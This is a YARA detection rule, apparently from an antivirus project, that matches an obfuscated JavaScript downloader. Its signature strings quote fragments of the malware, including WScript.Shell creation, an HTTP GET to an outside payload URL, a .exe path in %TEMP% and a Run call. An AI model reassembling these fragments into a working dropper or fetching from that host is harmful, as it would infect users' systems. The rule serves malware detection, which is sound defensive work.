rule sig_20160328_d01735a0924b81f8881e2f1560666579 {
  meta:
    description = "datamaliciousorder - file 20160328_d01735a0924b81f8881e2f1560666579.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8cd1b87ca18105e754284022e53e8c1b9727ca5c89c6f49d6a0f2e952ca068a8"

  strings:
    $s1  = "function Hhrqizjelq() {return Eoevzcr[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"v4FEaPrnNsYR8J.exe\";};" fullword ascii
    $s2  = "do {WScript[Npbbwoxyq](Mvucrm() * 11)} while (Nsndhmitmt[\"readystate\"] < 2 * 2);" fullword ascii
    $s3  = "function Pzzepqq(Gbdma, Fevvrer){return Gbdma - Fevvrer;};" fullword ascii
    $s4  = "Nsndhmitmt[Kbtch](\"GET\", \"http://perfect-nutrition.co.uk/lwqo9oa\", false);" fullword ascii
    $s5  = "var Eoevzcr = function Hnrkm() {return WScript[Mouoy](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Cubqy(Oyxknzcb){Eoevzcr[\"Run\"](Oyxknzcb, Jijlz, Jijlz);};" fullword ascii
    $s7  = "function Hikrb() {return ((Egtvqxlbd == true) && (Egtvqxlbd == Hzqtnmte)) ? 1 : Jijlz;};" fullword ascii
    $s8  = " while (Kuysom){" fullword ascii
    $s9  = "function Kwxieugcmm(Nssgyqdec) {var Kizpzbs = (1, 2, 3, 4, 5, Nssgyqdec); return Kizpzbs;};" fullword ascii
    $s10 = "var Egtvqxlbd = false;" fullword ascii
    $s11 = "function Mvucrm(){return 22;};" fullword ascii
    $s12 = "var Hzqtnmte = false;" fullword ascii
    $s13 = "Egtvqxlbd = true; " fullword ascii
    $s14 = "return Pzzepqq(Azpseg, Zolfxvgl);" fullword ascii
    $s15 = "function Wuzcp()" fullword ascii
    $s16 = "function Nucrql(){return Ihjbz;};" fullword ascii
    $s17 = "function Ninfpkmz(){return Mouoy;};" fullword ascii
    $s18 = "var Xosrxrj = new this[\"Date\"]();" fullword ascii
    $s19 = "var Owhhb = false;" fullword ascii
    $s20 = "Hzqtnmte = true; " fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}